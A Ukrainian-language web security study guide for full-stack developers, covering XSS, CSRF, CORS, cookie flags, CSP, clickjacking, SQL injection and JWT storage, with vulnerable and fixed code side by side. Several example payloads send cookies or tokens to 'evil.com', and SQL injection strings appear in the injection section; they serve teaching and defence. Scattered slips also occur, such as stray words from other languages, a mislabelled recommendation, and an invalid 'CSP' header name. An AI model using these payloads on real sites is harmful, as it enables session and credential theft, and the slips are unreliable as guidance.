# Web Security для Full-Stack Engineer

## Що таке OWASP Top 10?

OWASP (Open Web Application Security Project) Top 10 — це список найпоширеніших та найнебезпечніших вразливостей у веб-додатках, що оновлюється кожні 3-4 роки. Актуальна версія на 2024: **OWASP Top 10 2021** (уточнена у 2023-2024).

Основні вразливості (у порядку критичності):
1. **Broken Access Control** — неправильна перевірка дозволів
2. **Cryptographic Failures** — слабка криптографія, витік даних
3. **Injection** — SQL Injection, Command Injection, XSS
4. **Insecure Design** — відсутність безпеки на рівні архітектури
5. **Security Misconfiguration** — неправильна конфігурація сервера/фреймворку
6. **Vulnerable and Outdated Components** — небезпечні залежності
7. **Authentication Failures** — брак або слаба аутентифікація
8. **Data Integrity Failures** — відсутність перевірки цілісності даних
9. **Logging and Monitoring Failures** — відсутність логування атак
10. **SSRF (Server-Side Request Forgery)** — маніпуляція запитами до внутрішніх сервісів

Для фронтенду найактуальніші: Injection (XSS), Broken Access Control, Authentication Failures, Cryptographic Failures.

---

## Що таке XSS (Cross-Site Scripting)?

XSS — це атака, під час якої зловмисник вводить шкідливий JavaScript-код у веб-сторінку, щоб виконати його від імені користувача. Є три основних типи:

### 1. Stored XSS (зберігаюча)

Код зберігається в базі даних, виконується для всіх користувачів.

```javascript
// Вразлива форма: коментар без санітизації
app.post('/comments', (req, res) => {
  const comment = req.body.comment; // Небезпечно! Пряме зберігання
  db.comments.insert({ text: comment });
  res.json({ success: true });
});

// Атака: користувач пишає коментар
// <img src=x onerror="fetch('http://evil.com?cookies=' + document.cookie)">
// Цей код виконується для всіх користувачів, які читають коментар!
```

**Захист:**
```javascript
// 1. Санітизація на рівні бази
const DOMPurify = require('isomorphic-dompurify');
app.post('/comments', (req, res) => {
  const cleaned = DOMPurify.sanitize(req.body.comment);
  db.comments.insert({ text: cleaned });
  res.json({ success: true });
});

// 2. Escape при виведенні (найкращий варіант для HTML-контексту)
// На фронтенді — не використовувати innerHTML для UGC
function displayComment(comment) {
  const el = document.createElement('div');
  el.textContent = comment; // Автоматично escape спеціальні символи
  commentsList.appendChild(el);
}
```

### 2. Reflected XSS (віддзеркалена)

Код вводиться через URL та одразу виконується, не зберігаючись.

```javascript
// Уразливий код на сервері
app.get('/search', (req, res) => {
  const query = req.query.q;
  res.send(`<h1>Результати для: ${query}</h1>`); // Пряме виставлення!
});

// Атака через URL:
// /search?q=<script>alert(document.cookie)</script>
// Браузер виконає скрипт для конкретного користувача

// Захист: escape HTML метазнаків
const escapeHtml = (str) => {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#x27;'
  };
  return str.replace(/[&<>"']/g, m => map[m]);
};

app.get('/search', (req, res) => {
  const safe = escapeHtml(req.query.q);
  res.send(`<h1>Результати для: ${safe}</h1>`);
});
```

### 3. DOM-based XSS

JavaScript на сторінці невірно обробляє дані з DOM, URL чи localStorage.

```javascript
// Вразливий фронтенд код
const userComment = new URLSearchParams(window.location.search).get('comment');
document.getElementById('display').innerHTML = userComment; // ОПАСНО!

// Атака: /page?comment=<img src=x onerror="alert('XSS')">
// Скрипт виконається навіть без сервера!

// Захист: використовувати textContent або createTextNode
const userComment = new URLSearchParams(window.location.search).get('comment');
const el = document.createElement('p');
el.textContent = userComment; // Безпечно: escape автоматичний
document.getElementById('display').appendChild(el);

// Або з DOMPurify для HTML-контенту
const sanitized = DOMPurify.sanitize(userComment);
document.getElementById('display').innerHTML = sanitized;
```

---

## Як захищатися від XSS?

### 1. Escape Output (Екранування виводу)

Кожна мова має вбудовані утиліти:

```javascript
// JavaScript/Node.js
const entities = {
  '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#x27;'
};
const escapeHtml = (str) => str.replace(/[&<>"']/g, ch => entities[ch]);

// React — автоматично екранує за замовчуванням
function App() {
  const userInput = "<img src=x onerror='alert(1)'>";
  return <div>{userInput}</div>; // Безпечно! Виведе як текст
}

// Небезпечно тільки з dangerouslySetInnerHTML
return <div dangerouslySetInnerHTML={{ __html: userInput }} />; // НЕ РОБІТЬ!
```

### 2. Content Security Policy (CSP)

HTTP-заголовок, який обмежує джерела для скриптів, стилів, зображень:

```html
<!-- Заголовок відповіді: -->
<!-- Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.com; style-src 'self' 'unsafe-inline' -->

<!-- Тепер браузер:
     - Завантажує скрипти тільки з поточного домену та trusted.com
     - Блокує inline <script> (якщо не додати 'unsafe-inline')
     - Блокує eval(), new Function()
     - Дозволяє стилі з 'self' та inline (якщо в директиві)
-->

<!-- На сервері (Express): -->
app.use((req, res, next) => {
  res.setHeader('Content-Security-Policy', 
    "default-src 'self'; script-src 'self' https://trusted.cdn.com; style-src 'self' 'unsafe-inline'");
  next();
});

<!-- У HTML: -->
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'" />
```

### 3. Sanitization з DOMPurify

```javascript
import DOMPurify from 'dompurify';

// Дозволити базовий HTML, заблокувати скрипти
const dirtyHtml = '<p>Hello <script>alert("XSS")</script></p>';
const cleanHtml = DOMPurify.sanitize(dirtyHtml);
// Результат: '<p>Hello </p>' (скрипт видалений)

// Конфіг — дозволити певні теги
const config = { ALLOWED_TAGS: ['p', 'br', 'strong', 'em'], ALLOWED_ATTR: [] };
const cleaned = DOMPurify.sanitize(dirtyHtml, config);
```

### 4. Avoid innerHTML

```javascript
// ОПАСНО
el.innerHTML = userInput;

// БЕЗПЕЧНО
el.textContent = userInput; // Для текстового контенту
el.appendChild(document.createTextNode(userInput)); // Альтернатива

// Якщо потрібен HTML з підтримкою безпеки
import DOMPurify from 'dompurify';
el.innerHTML = DOMPurify.sanitize(userInput);
```

---

## Що таке CSRF (Cross-Site Request Forgery)?

CSRF — це атака, коли зловмисник змушує користувача виконати дію на іншому сайті без його відома. Користувач вже авторизований, тому браузер автоматично відправляє cookies.

```
┌─────────────────────────────────────────────────────┐
│ CSRF Атака                                          │
│                                                     │
│ 1. Користувач логінється на bank.com               │
│    → браузер зберігає session cookie                │
│                                                     │
│ 2. Користувач без закриття сесії переходить на    │
│    evil.com (або ще відкритий в іншій вкладці)   │
│                                                     │
│ 3. evil.com містить:                               │
│    <form action="https://bank.com/transfer" ...>  │
│    або скрипт:                                     │
│    fetch('https://bank.com/transfer', {            │
│      method: 'POST',                               │
│      credentials: 'include', // Відправляє cookies!│
│      body: formData                                │
│    })                                              │
│                                                     │
│ 4. Браузер АВТОМАТИЧНО додає session cookie       │
│    (тому що credentials: 'include')               │
│                                                     │
│ 5. Переказ виконується від імені користувача!     │
│                                                     │
│ Захист: браузер не буде відправляти cookies,      │
│ якщо SameSite=Strict/Lax встановлена!             │
└─────────────────────────────────────────────────────┘
```

---

## Як захищатися від CSRF?

### 1. SameSite Cookies (Найкращий сучасний захист)

```javascript
// На сервері встановіть cookie з SameSite флагом
res.cookie('sessionId', token, {
  httpOnly: true,
  secure: true, // Тільки HTTPS
  sameSite: 'Strict' // або 'Lax'
  // Strict: cookie відправляється тільки на той же домен
  // Lax: дозволяє top-level navigation (посилання), але не fetch/forms з інших сайтів
  // None: дозволяє усім (потребує Secure: true, тобто HTTPS)
});

// Браузер НІКОЛИ не відправить цей cookie для cross-site запитів
// fetch('https://bank.com/transfer', { credentials: 'include' })
// Навіть якщо користувач авторизований! Cookie не буде додана.
```

### 2. CSRF Tokens (Класичний метод, також актуальний)

```javascript
// На сервері: створити та зберегти токен
app.get('/form', (req, res) => {
  const csrfToken = crypto.randomBytes(32).toString('hex');
  req.session.csrfToken = csrfToken; // Зберегти в сесії
  res.render('form', { csrfToken });
});

// У HTML-формі:
// <form action="/transfer" method="POST">
//   <input type="hidden" name="_csrf" value="<%= csrfToken %>">
//   <input type="text" name="amount">
//   <button>Перевести</button>
// </form>

// На сервері: перевірити токен
app.post('/transfer', (req, res) => {
  if (req.body._csrf !== req.session.csrfToken) {
    return res.status(403).send('CSRF token invalid');
  }
  // Обробити переказ
  res.json({ success: true });
});

// Для AJAX запитів: додати токен у заголовок
const csrfToken = document.querySelector('meta[name="csrf-token"]').content;
fetch('/api/transfer', {
  method: 'POST',
  headers: { 'X-CSRF-Token': csrfToken },
  body: JSON.stringify({ amount: 100 })
});
```

### 3. Custom Headers (Безпечна альтернатива)

```javascript
// Браузер НЕ ДОЗВОЛЯЄ додавати custom headers в cross-site запитах
// (через CORS preflight). Тому будь-який fetch з спеціальним заголовком
// від evil.com блокується браузером.

// На фронтенді (безпечна з'їдиночного домену):
fetch('/api/transfer', {
  method: 'POST',
  headers: { 'X-Requested-With': 'XMLHttpRequest' }, // Custom header!
  body: JSON.stringify({ amount: 100 })
});

// evil.com НЕ МОЖЕ додати цей заголовок (браузер блокує)
// Сервер перевіряє наявність заголовка як індикатор легітимного запиту
app.post('/api/transfer', (req, res) => {
  if (req.headers['x-requested-with'] !== 'XMLHttpRequest') {
    return res.status(403).send('Invalid request');
  }
  // Обробити
});
```

---

## Що таке Same-Origin Policy (SOP)?

Same-Origin Policy — фундаментальне правило безпеки браузера. Два URL вважаються одного походження, якщо мають однаковий:
- Протокол (http vs https)
- Домен (example.com vs sub.example.com)
- Порт (8080 vs 3000)

```javascript
// https://example.com:443/page

// ✅ Допустимо (Same-Origin):
// https://example.com/other
// https://example.com:443/api

// ❌ Заблоковано (Different-Origin):
// http://example.com (інший протокол)
// https://other.com (інший домен)
// https://example.com:8080 (інший порт)
// https://sub.example.com (піддомен НЕ вважається тим самим!)

// SOP відповідає за:
// 1. XHR/fetch запити (блокуються за умовчанням)
// 2. Доступ до cookie (読め accessibleтільки для свого домена)
// 3. Доступ до localStorage/sessionStorage (по-окремому для кожного походження)
// 4. Доступ до змісту iframe (блокується для cross-origin)

// ❌ Уразливо:
const data = fetch('https://other.com/api').then(r => r.json());
// Браузер блокує! CORS preflight потребує дозволу від other.com

// ✅ Безпечно:
const data = fetch('/api/local').then(r => r.json());
// Same-origin, дозволено без обмежень
```

---

## Що таке CORS (Cross-Origin Resource Sharing)?

CORS — механізм, який дозволяє серверу явно дозволити cross-origin запити. Використовує HTTP-заголовки.

```
┌──────────────────────────────────────────────────────┐
│ CORS Preflight Flow                                  │
│                                                      │
│ 1. Браузер хочет виконати запит на інший домен      │
│    fetch('https://api.other.com/data', {            │
│      method: 'POST',                                │
│      headers: { 'Content-Type': 'application/json'} │
│    })                                               │
│                                                      │
│ 2. Браузер спочатку відправляє OPTIONS запит        │
│    (preflight):                                     │
│    OPTIONS /data HTTP/1.1                          │
│    Origin: https://example.com                      │
│    Access-Control-Request-Method: POST              │
│                                                      │
│ 3. Сервер відповідає дозволяючими заголовками:    │
│    Access-Control-Allow-Origin: https://example.com│
│    Access-Control-Allow-Methods: POST, GET, PUT     │
│    Access-Control-Allow-Headers: Content-Type       │
│    Access-Control-Max-Age: 3600                     │
│                                                      │
│ 4. Якщо дозволено, браузер відправляє справжній    │
│    запит (POST):                                    │
│    POST /data HTTP/1.1                             │
│    ...                                              │
│                                                      │
│ 5. Браузер отримує дані та дозволяє JavaScript     │
│    прочитати їх (лише якщо CORS дозволено)        │
└──────────────────────────────────────────────────────┘
```

```javascript
// На сервері (Express) — дозволити CORS від specific origin
const cors = require('cors');

const corsOptions = {
  origin: 'https://trusted.example.com', // Дозволити тільки цей домен
  credentials: true, // Дозволити cookies
  methods: ['GET', 'POST'],
  allowedHeaders: ['Content-Type']
};

app.use(cors(corsOptions));

// Або вручну встановити заголовки:
app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', 'https://trusted.example.com');
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  
  // Обробити preflight OPTIONS запит
  if (req.method === 'OPTIONS') {
    return res.sendStatus(200);
  }
  next();
});

// На фронтенді
fetch('https://api.other.com/data', {
  method: 'POST',
  credentials: 'include', // Відправити cookies
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ name: 'John' })
}).then(r => r.json());
```

⚠️ **Лайфхак:** `Access-Control-Allow-Origin: *` дозволяє всім, але `credentials: true` не працює з `*`. Завжди вказуйте конкретний домен!

---

## httpOnly, Secure, SameSite Flags

Ці флаги встановлюються при створенні cookie на сервері:

```javascript
// Повний безпечний приклад
res.cookie('sessionId', token, {
  httpOnly: true,   // ❌ JavaScript НЕ може прочитати (document.cookie)
                    // ✅ Захист від XSS: навіть якщо вводиться код,
                    //    не зможе викрасти сесію
  
  secure: true,     // ✅ Cookie відправляється ТІЛЬКИ по HTTPS
                    // ❌ HTTP запити НЕ отримають cookie
  
  sameSite: 'Strict', // ✅ Cookie НЕ відправляється на cross-site запити
                      // Варіанти:
                      // - 'Strict': тільки same-site
                      // - 'Lax': дозволяє top-level navigation (посилання)
                      // - 'None': все, але потребує secure: true
  
  maxAge: 3600000   // Час життя (мс), тут 1 година
});

// ❌ ОПАСНО: це дозволяє XSS прочитати сесію
res.cookie('sessionId', token, {
  httpOnly: false // JavaScript може прочитати!
});

// Атака при httpOnly: false
// <script>
//   const cookies = document.cookie;
//   fetch('http://evil.com?stolen=' + cookies);
// </script>

// ❌ ОПАСНО: cookie не буде відправлена по HTTP
// (тільки по HTTPS), але якщо фронтенд іноді грузиться
// по HTTP, користувач втратить авторизацію
res.cookie('sessionId', token, {
  secure: true,
  protocol: 'http' // Мешшах!
});
```

| Флаг | Що робить | Коли ставити |
|---|---|---|
| `httpOnly: true` | JS не може прочитати `document.cookie` | ВСЕГДА для сесійних cookies |
| `secure: true` | Cookie тільки по HTTPS | ВСЕГДА на production |
| `sameSite: 'Strict'` | Не відправляється cross-site | Для критичних операцій (банк, платежі) |
| `sameSite: 'Lax'` | Дозволяє посилання, але не fetch | Стандартний рівень (рекомендовано) |

---

## Content Security Policy (CSP) — Детальніше

CSP надає гранульярний контроль над ресурсами, які браузер може завантажувати:

```javascript
// На сервері: встановити CSP заголовок
app.use((req, res, next) => {
  res.setHeader('Content-Security-Policy', [
    "default-src 'self'",           // За умовчанням дозволити тільки з цього домену
    "script-src 'self' 'nonce-abc123' https://trusted-cdn.com", // Скрипти
    "style-src 'self' 'unsafe-inline'", // Стилі (unsafe-inline дозволяє <style>)
    "img-src 'self' data: https:",   // Картинки з mismo, data:// та https
    "connect-src 'self' https://api.trusted.com", // AJAX/WebSocket
    "font-src 'self'",               // Шрифти
    "object-src 'none'",             // Плаґіни (Flash і т.д.)
    "frame-src 'self'",              // Вкладені фрейми
    "upgrade-insecure-requests",     // Конвертувати HTTP → HTTPS
    "report-uri https://report.example.com/csp" // Де報告порушення
  ].join('; '));
  next();
});

// Результат:
// ✅ <script src="/main.js"></script> — OK (same-origin)
// ✅ <script nonce="abc123">alert(1)</script> — OK (nonce matched)
// ✅ <script src="https://trusted-cdn.com/lib.js"></script> — OK
// ❌ <script src="https://evil.com/hack.js"></script> — Заблоковано!
// ❌ <script>eval('...')</script> — Заблоковано!
// ❌ <link rel="stylesheet" href="https://evil.com/style.css"> — Заблоковано!

// Nonce (number used once) — гарантує, що тільки вишукувач-розроблювач
// може використовувати inline скрипти (не зловмисник через XSS)
app.get('/', (req, res) => {
  const nonce = crypto.randomBytes(16).toString('hex');
  res.setHeader('Content-Security-Policy', `script-src 'nonce-${nonce}'`);
  res.send(`
    <script nonce="${nonce}">
      console.log('Safe!');
    </script>
  `);
});
```

**CSP директиви:**
- `default-src` — fallback для всіх типів
- `script-src` — джерела JS
- `style-src` — джерела CSS
- `img-src` — картинки
- `connect-src` — AJAX, WebSocket, beacon
- `font-src` — вебшрифти
- `media-src` — аудіо/відео
- `object-src` — плаґіни
- `frame-src` — вложенные фреймы
- `upgrade-insecure-requests` — HTTP → HTTPS
- `report-uri` — де відправляти порушення

---

## Clickjacking та захист

Clickjacking — атака, коли зловмисник приховує елемент вашого сайту під прозорим iframe та змушує користувача клікнути на нього, думаючи, що клікає на щось інше.

```html
<!-- evil.com (зловмисник) -->
<button>Click to win a prize!</button>

<!-- Прозорий iframe з вашим банком поверху -->
<iframe 
  src="https://bank.com/transfer?to=attacker&amount=1000"
  style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; opacity: 0; pointer-events: auto;"
></iframe>

<!-- Користувач мислить, що клікає на "Click to win a prize!"
     насправді клікає на кнопку "Передати" в банку! -->
```

**Захист:**

### 1. X-Frame-Options заголовок

```javascript
// На сервері: скажіть браузеру не дозволяти вкладення у iframe
app.use((req, res, next) => {
  // DENY — не дозволяти вкладення вообще
  // res.setHeader('X-Frame-Options', 'DENY');
  
  // SAMEORIGIN — дозволити тільки вкладення з stesso домена
  res.setHeader('X-Frame-Options', 'SAMEORIGIN');
  
  // ALLOW-FROM https://trusted.com — конкретний домен (застарілий, краще CSP)
  
  next();
});

// Результат: evil.com НЕ МОЖЕ вкласти ваш сайт в iframe!
// Браузер виконає X-Frame-Options і блокує вміст
```

### 2. Content Security Policy (frame-ancestors)

```javascript
// Більш сучасний та гнучкий варіант
res.setHeader('Content-Security-Policy', "frame-ancestors 'self'");

// Або дозволити конкретні домени
res.setHeader('Content-Security-Policy', "frame-ancestors 'self' https://trusted.com");

// Блокувати вкладення вообще
res.setHeader('Content-Security-Policy', "frame-ancestors 'none'");
```

---

## SQL Injection у Single Page Application

У SPA користувач часто будує запити на фронтенді, відправляючи їх на API. **Проблема:** якщо користувач контролює SQL-запит, можна вкласти вредоносний код.

```javascript
// ❌ ОПАСНО: пряме конкатенування SQL
const userId = req.query.id; // "1; DROP TABLE users; --"
const query = `SELECT * FROM users WHERE id = ${userId}`;
// Результат SQL: SELECT * FROM users WHERE id = 1; DROP TABLE users; --
// Таблиця видалена!

// ❌ ОПАСНО: шаблонні строки НЕ рятують
const query = `SELECT * FROM users WHERE email = '${email}'`;
// Введення: admin'--
// Результат: SELECT * FROM users WHERE email = 'admin'--'
// Логін як admin без пароля!

// ✅ БЕЗПЕЧНО: використовуйте параметризовані запити
const query = 'SELECT * FROM users WHERE id = ? AND email = ?';
db.query(query, [userId, email], (err, result) => {
  // Параметри передаються окремо, SQL-синтаксис не змінюється
});

// ✅ БЕЗПЕЧНО: ORM (Sequelize, TypeORM, Prisma)
const user = await User.findOne({ where: { id: userId } });
// ORM автоматично екранує параметри

// ✅ БЕЗПЕЧНО: подвійна перевірка на фронтенді + сервері
// Сервер повинен ВСЕГДА валідувати та санітизувати input!
if (!Number.isInteger(userId) || userId < 0) {
  return res.status(400).send('Invalid ID');
}
const query = 'SELECT * FROM users WHERE id = ?';
db.query(query, [userId]);
```

---

## JWT у localStorage vs httpOnly Cookie

| Аспект | JWT у localStorage | JWT у httpOnly Cookie |
|---|---|---|
| **Доступ з JS** | Читається та видаляється легко | Недоступна JS (безпечніше від XSS) |
| **CSRF** | Захищена (потребує custom header) | Потребує SameSite + CSRF token |
| **XSS** | ❌ Украдеться через `localStorage.getItem()` | ✅ Захищена (JS не може прочитати) |
| **Мобільні додатки** | ✅ Простіше (немає cookies) | ❌ Складніше (потребує управління) |
| **Logout** | ⚠️ Потребує очистки JS | ✅ Очистити на сервері (cookie буде видалена) |
| **Refresh Token** | Можна зберегти в localStorage | Краще у httpOnly (і Secure) |

```javascript
// ❌ РЕКОМЕНДОВАНО: JWT у localStorage
localStorage.setItem('token', jwtToken);
const token = localStorage.getItem('token');
fetch('/api/data', {
  headers: { 'Authorization': `Bearer ${token}` }
});

// Проблема: якщо XSS вводить код, він крадає token
// <script>
//   fetch('http://evil.com?stolen=' + localStorage.getItem('token'));
// </script>

// ✅ РЕКОМЕНДОВАНО: JWT у httpOnly cookie
res.cookie('jwt', jwtToken, { httpOnly: true, secure: true, sameSite: 'Strict' });

// Браузер автоматично відправляє cookie, JS не може прочитати
fetch('/api/data', { credentials: 'include' });

// Навіть при XSS, зловмисник не може прочитати JWT
// (але МОЖЕ відправити запит від імені користувача!)

// Гібридний підхід (рекомендовано):
// - Access Token (JWT): httpOnly cookie, коротко-живучий (15 хв)
// - Refresh Token: httpOnly cookie, довго-живучий (7 днів)
// - Обновлення доступу без залучення користувача
app.post('/refresh', (req, res) => {
  const refreshToken = req.cookies.refreshToken;
  if (!isValidRefreshToken(refreshToken)) {
    return res.status(401).send('Invalid token');
  }
  const newAccessToken = generateAccessToken();
  res.cookie('accessToken', newAccessToken, { httpOnly: true, secure: true, maxAge: 900000 });
  res.json({ success: true });
});
```

---

## Subresource Integrity (SRI) для CDN-скриптів

SRI гарантує, що скрипт / стиль з CDN не був модифікований. Браузер перевіряє хеш.

```html
<!-- Генеруємо хеш скрипту на CDN -->
<!-- echo -n "script content" | openssl dgst -sha384 -binary | openssl enc -base64 -->

<!-- ✅ Безпечно: Додаємо integrity атрибут -->
<script 
  src="https://trusted-cdn.com/lib.js"
  integrity="sha384-abc123xyz"
  crossorigin="anonymous"
></script>

<!-- Браузер:
     1. Завантажує скрипт
     2. Обчислює SHA-384 хеш завантаженого вмісту
     3. Порівнює з integrity хешем
     4. Якщо не збігаються → блокує виконання скрипту!

     Захист: навіть якщо CDN skомпрометована,
     модифікований скрипт не виконається
-->

<!-- Для стилів -->
<link 
  rel="stylesheet" 
  href="https://trusted-cdn.com/style.css"
  integrity="sha384-def456uvw"
  crossorigin="anonymous"
>

<!-- crossorigin="anonymous" — обов'язково для CDN,
     дозволяє CORS та відправляє Origin заголовок
-->
```

---

## Security Checklist

- [ ] Усі API повинні перевіряти авторизацію (навіть якщо вони публічні)
- [ ] Використовувати httpOnly, Secure, SameSite cookies для sessions
- [ ] Встановити CSP заголовок (мінімум `default-src 'self'`)
- [ ] Установити `X-Frame-Options: SAMEORIGIN` або CSP frame-ancestors
- [ ] Санітизувати User-Generated Content (DOMPurify, markdown-it + DOMPurify)
- [ ] Escape HTML метазнаки при виведенні (або використовувати `textContent`)
- [ ] Уникати `innerHTML` для UGC
- [ ] КРСF токен для forms (або SameSite='Strict')
- [ ] Параметризовані запити або ORM (ніколи не конкатенвати SQL)
- [ ] Валідація на сервері (навіть якщо маємо клієнтську валідацію)
- [ ] Логування та моніторинг: подозрілі запити, неудачні логіни, CORS помилки
- [ ] Регулярно оновлювати залежності (npm audit)
- [ ] Генерувати та ротувати CSRF токени
- [ ] Встановлювати SRI для CDN скриптів/стилів
- [ ] Тестувати на OWASP Top 10 перед deploymentом

---

## Типові Пастки

**1. Забув httpOnly на cookie**
```javascript
// ❌ Пастка
res.cookie('token', jwt);
// XSS украдає через document.cookie

// ✅ Сідалась
res.cookie('token', jwt, { httpOnly: true });
```

**2. CSP префіксом дозволяє усім**
```javascript
// ❌ Пастка
res.setHeader('CSP', "default-src *");
// Це як взагалі не встановлювати CSP

// ✅ Правильно
res.setHeader('CSP', "default-src 'self'");
```

**3. Забув перевірити CSRF на сервері**
```javascript
// ❌ Пастка: браузер знає про SameSite, але старші версії его ігнорують
// Пакуватися тільки на SameSite危險

// ✅ На практиці: SameSite + CSRF token
```

**4. Зберегти sensitive дані в localStorage**
```javascript
// ❌ Пастка
localStorage.setItem('apiKey', secretKey);
// XSS легко крадує через window.localStorage

// ✅ Зберегти в httpOnly cookie або в памяти змінної (втратиться при перезавантажу)
```

**5. eval() або new Function() с user input**
```javascript
// ❌ ОПАСНО
const code = req.query.code;
eval(code); // Користувач може ввести будь-який JavaScript!

// ✅ Безпечна альтернатива: Worker, sandboxed iframe або спеціальні мови
```

**6. Не перевірити Origin у CORS**
```javascript
// ❌ Пастка
res.setHeader('Access-Control-Allow-Origin', '*');
// Хто завгодно може доступити ваш API

// ✅ Правильно
res.setHeader('Access-Control-Allow-Origin', 'https://trusted.example.com');
```

---

Все це рекомендується знати для Senior позиції у Full-Stack розробці. На інтерв'ю часто питають про реальні сценарії та trade-offs, тому практикуйтеся писати pequenhos але безпечні приклади.
